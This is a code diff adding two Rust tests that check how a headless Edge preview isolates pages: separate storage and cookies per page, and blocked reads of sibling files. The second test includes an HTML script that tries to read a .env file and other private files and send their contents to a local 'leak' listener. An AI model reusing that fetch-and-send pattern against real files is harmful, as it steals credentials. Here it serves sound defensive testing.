@@ -707,6 +707,162 @@ mod tests {
         );
     }
 
+    #[cfg(target_os = "windows")]
+    #[tokio::test]
+    async fn real_edge_pages_isolate_storage_cookies_and_cross_origin_reads() {
+        let _guard = browser_lock().lock().await;
+        let dir = temp_dir("preview-origins");
+        for file in ["first.html", "second.html"] {
+            std::fs::write(dir.join(file), "<!doctype html><title>isolated</title>").unwrap();
+        }
+        let server = crate::preview_server::global().unwrap();
+        let first = server
+            .url_for_path(&dir.join("first.html"), std::slice::from_ref(&dir))
+            .unwrap();
+        let ctx = ctx(&dir);
+        shutdown_helper();
+        let run = |input| execute_headless(input, &ctx, false);
+        let opened = run(BrowserInput {
+            path: Some("first.html".into()),
+            ..act("open")
+        })
+        .await;
+        assert!(!opened.is_error, "{}", opened.content);
+        let saved = run(BrowserInput { expression: Some("localStorage.setItem('private','first'); document.cookie='private=first; SameSite=Lax'; 'saved'".into()), ..act("eval") }).await;
+        assert!(!saved.is_error, "{}", saved.content);
+        let opened = run(BrowserInput {
+            path: Some("second.html".into()),
+            ..act("open")
+        })
+        .await;
+        assert!(!opened.is_error, "{}", opened.content);
+        let expression = format!("(async () => {{ const result = {{storage:localStorage.getItem('private'),cookie:document.cookie}}; try {{ await fetch({}); result.cross='read'; }} catch {{ result.cross='blocked'; }} localStorage.setItem('private','second'); document.cookie='private=second; SameSite=Lax'; return result; }})()", serde_json::to_string(&first).unwrap());
+        let isolated = run(BrowserInput {
+            expression: Some(expression),
+            ..act("eval")
+        })
+        .await;
+        assert!(!isolated.is_error, "{}", isolated.content);
+        assert!(
+            isolated.content.contains("\"storage\":null")
+                && isolated.content.contains("\"cookie\":\"\"")
+                && isolated.content.contains("\"cross\":\"blocked\""),
+            "{}",
+            isolated.content
+        );
+        let reopened = run(BrowserInput {
+            path: Some("first.html".into()),
+            ..act("open")
+        })
+        .await;
+        assert!(!reopened.is_error, "{}", reopened.content);
+        let restored = run(BrowserInput {
+            expression: Some(
+                "({storage:localStorage.getItem('private'),cookie:document.cookie})".into(),
+            ),
+            ..act("eval")
+        })
+        .await;
+        shutdown_helper();
+        std::fs::remove_dir_all(dir).unwrap();
+        assert!(!restored.is_error, "{}", restored.content);
+        assert!(
+            restored.content.contains("\"storage\":\"first\"")
+                && restored.content.contains("private=first")
+                && !restored.content.contains("private=second"),
+            "{}",
+            restored.content
+        );
+    }
+
+    #[cfg(target_os = "windows")]
+    #[tokio::test]
+    async fn real_edge_page_modules_work_but_sibling_data_cannot_be_read_or_sent() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        let _guard = browser_lock().lock().await;
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let trap = format!(
+            "http://127.0.0.1:{}/leak",
+            listener.local_addr().unwrap().port()
+        );
+        let leaks = std::sync::Arc::new(AtomicUsize::new(0));
+        let observed = leaks.clone();
+        let server = tokio::spawn(async move {
+            loop {
+                let (mut socket, _) = listener.accept().await.unwrap();
+                let mut buffer = [0u8; 4096];
+                socket.read(&mut buffer).await.unwrap();
+                observed.fetch_add(1, Ordering::SeqCst);
+                socket.write_all(b"HTTP/1.1 204 No Content\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").await.unwrap();
+            }
+        });
+        let dir = temp_dir("preview-confidentiality");
+        std::fs::write(dir.join(".env"), "CREDENTIAL_MARKER").unwrap();
+        std::fs::write(dir.join("private.txt"), "PRIVATE_MARKER").unwrap();
+        std::fs::write(dir.join("data.json"), "{\"private\":true}").unwrap();
+        std::fs::write(dir.join("module.mjs"), "export const label = 'module-ok';").unwrap();
+        let html = r#"<!doctype html><div id="ready">pending</div><script type="module">
+import { label } from './module.mjs';
+const statuses = [];
+for (const path of ['private.txt', '.env', 'data.json']) {
+  const response = await fetch(path);
+  const body = await response.text();
+  statuses.push(response.status);
+  if (response.ok) await fetch('__TRAP__?data=' + encodeURIComponent(body));
+}
+document.getElementById('ready').textContent = [label, ...statuses].join(':');
+</script>"#
+            .replace("__TRAP__", &trap);
+        std::fs::write(dir.join("index.html"), html).unwrap();
+        let ctx = ctx(&dir);
+        shutdown_helper();
+        let opened = execute_headless(
+            BrowserInput {
+                path: Some("index.html".into()),
+                ..act("open")
+            },
+            &ctx,
+            false,
+        )
+        .await;
+        let ready = execute_headless(
+            BrowserInput {
+                text: Some("module-ok:403:403:403".into()),
+                ms: Some(5000),
+                ..act("wait")
+            },
+            &ctx,
+            false,
+        )
+        .await;
+        let dom = execute_headless(
+            BrowserInput {
+                selector: Some("#ready".into()),
+                ..act("dom")
+            },
+            &ctx,
+            false,
+        )
+        .await;
+        shutdown_helper();
+        server.abort();
+        let _ = server.await;
+        std::fs::remove_dir_all(dir).unwrap();
+        assert!(!opened.is_error, "{}", opened.content);
+        assert!(!ready.is_error, "{}", ready.content);
+        assert!(
+            dom.content.contains("module-ok:403:403:403"),
+            "{}",
+            dom.content
+        );
+        assert_eq!(
+            leaks.load(Ordering::SeqCst),
+            0,
+            "the page transmitted sibling data to the collector"
+        );
+    }
+
     /// UI2-0926 #8:screenshot 不重新导航(输入值还在)→ press Enter 提交表单 → wait 文字
     /// → eval 回 JSON;静态服务下 ES module 页面能渲染,file:// 对照白屏。
     #[cfg(target_os = "windows")]
